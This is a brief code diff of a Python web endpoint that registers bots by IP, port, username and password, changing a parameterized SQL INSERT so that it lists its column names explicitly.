@@ -18,7 +18,7 @@ def new_bot():
             pword is not None):
         c = get_db().cursor()
         i_port = int(port)
-        c.execute("INSERT INTO bots values (?, ?, ?, ?)", (ip, i_port, uname, pword))
+        c.execute("INSERT INTO bots (ip, port, uname, pword) values (?, ?, ?, ?)", (ip, i_port, uname, pword))
         get_db().commit()
         return jsonify({'success': True})
     else:
